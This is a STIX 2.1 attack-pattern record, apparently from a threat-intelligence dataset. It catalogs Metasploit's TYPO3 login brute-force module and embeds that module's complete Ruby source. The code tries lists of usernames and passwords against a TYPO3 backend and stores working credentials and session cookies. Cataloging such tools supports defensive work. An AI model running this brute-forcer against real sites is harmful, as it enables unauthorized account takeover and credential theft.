{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5318232-87b3-477a-a3e5-2f1a82727bfe",
    "created": "2024-08-14T16:28:47.722303Z",
    "modified": "2024-08-14T16:28:47.722307Z",
    "name": "Typo3 Login Bruteforcer",
    "description": "This module attempts to bruteforce Typo3 logins.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/typo3_bruteforce.rb",
            "external_id": "typo3_bruteforce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Typo3\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Typo3 Login Bruteforcer',\n      'Description' => 'This module attempts to bruteforce Typo3 logins.',\n      'Author'      => [ 'Christian Mehlmauer' ],\n      'License'     => MSF_LICENSE\n    )\n  end\n\n  def run_host(ip)\n    print_status(\"Trying to bruteforce login\")\n\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'\t => target_uri.to_s\n    })\n\n    unless res\n      vprint_error(\"#{ip} seems to be down\")\n      return\n    end\n\n    each_user_pass { |user, pass|\n      try_login(user,pass)\n    }\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def try_login(user, pass)\n    vprint_status(\"Trying username:'#{user}' password: '#{pass}'\")\n    cookie = typo3_backend_login(user, pass)\n    if cookie\n      print_good(\"Successful login '#{user}' password: '#{pass}'\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'typo3',\n        user: user,\n        password: pass,\n        proof: cookie\n      )\n      return :next_user\n    else\n      vprint_error(\"failed to login as '#{user}' password: '#{pass}'\")\n      return\n    end\n  end\nend\n"
}